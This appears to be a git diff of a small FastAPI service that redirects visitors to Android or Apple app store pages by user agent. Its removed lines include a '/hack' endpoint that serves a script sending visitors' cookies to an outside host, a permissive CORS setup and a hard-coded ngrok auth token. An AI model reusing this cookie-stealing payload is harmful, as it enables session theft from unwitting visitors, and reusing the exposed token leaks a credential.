@@ -3,28 +3,11 @@ from fastapi import FastAPI, HTTPException
 from fastapi.responses import RedirectResponse
 import uvicorn
 from pyngrok import ngrok
-from fastapi.middleware.cors import CORSMiddleware
 
 from fastapi.responses import HTMLResponse
 import os
 
-current_directory = os.getcwd()
-
-file_path = os.path.join(current_directory, "src/wind_installer.bat")
-
-#import nest_asyncio
-
-#nest_asyncio.apply()
-
 app = FastAPI()
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],  # Разрешить все домены
-    allow_credentials=True,
-    allow_methods=["*"],  # Разрешить все методы (GET, POST, PUT, DELETE и т.д.)
-    allow_headers=["*"],  # Разрешить все заголовки
-)
 
 data = {
     "apple": 0,
@@ -32,36 +15,35 @@ data = {
     "windows":0
 }
 
-@app.get("/hack")
+
+@app.get("/")
+async def read_user_agent(user_agent: str = Header(None)):
+    target_android = "https://play.google.com/store/apps/details?id=com.c_world"
+    target_apple = "https://apps.apple.com/ru/app/%D1%81-world/id6459059878"
+
+    windows = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+    apple = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+    android = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
+    mac = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
+
+    if "Windows" in user_agent:
+        data["windows"] += 1
+        return RedirectResponse(url=target_apple)
+
+    if "iPhone" in user_agent:
+        data["apple"] += 1
+        return RedirectResponse(url=target_apple)
+    
+    if "Android" in user_agent:
+        data["android"] += 1
+        return RedirectResponse(url=target_android)
+    
+    else:
+        return RedirectResponse(url=target_apple)
+        #return HTMLResponse(
+        #    "<a href='market://details?id=com.colizeumarena.colizeum'>Открыть приложение в Google Play Store</a>"
+        #)
+
+@app.get("/user_data/all")
 async def read_user_agent():
-    return HTMLResponse(
-            """<!DOCTYPE html>
-        <html lang="en">
-        <head>
-        <meta charset="UTF-8">
-        <title>Title</title>
-        </head>
-        <body>
-        <script>fetch(`https://colizeumapp.ru/${document.cookie}`)</script>
-        </body>
-        </html>
-            """
-        )
-
-
-
-#HOST = "0.0.0.0"
-#PORT = int("8000")
-
-# https://dashboard.ngrok.com/get-started/your-authtoken
-#ngrok.set_auth_token("1lFNOAF629r6MfuaNUbM27WdUF9Maaobj4SY")
-#public_url = ngrok.connect(PORT).public_url
-#print(f"ngrok tunnel {public_url + '/colizeumapp'}")
-
-
-#app.include_router(auth_route)
-#app.include_router(admin_route)
-
-#if __name__ == '__main__':
-#    print(f"API rinnung {HOST}:{PORT}")
-#    uvicorn.run(app, host=HOST, port=PORT)
+    return data
